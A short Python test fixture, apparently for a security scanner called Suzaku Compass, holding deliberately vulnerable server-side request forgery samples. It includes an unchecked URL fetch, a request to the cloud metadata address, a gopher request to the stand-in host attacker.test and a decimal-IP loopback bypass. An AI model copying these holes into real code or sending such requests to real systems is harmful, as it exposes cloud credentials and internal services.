"""SSRF fixture for Suzaku Compass tests."""

import urllib.request
import requests


def fetch_unsafe(url: str) -> bytes:
    # SSRF: no allowlist for url
    return urllib.request.urlopen(url).read()


def aws_metadata():
    return requests.get("http://169.254.169.254/latest/meta-data/").text


def gopher_smuggle():
    return urllib.request.urlopen("gopher://attacker.test/_HTTP/1.0").read()


def ip_bypass():
    # decimal notation bypass
    return urllib.request.urlopen("http://2130706433/").read()
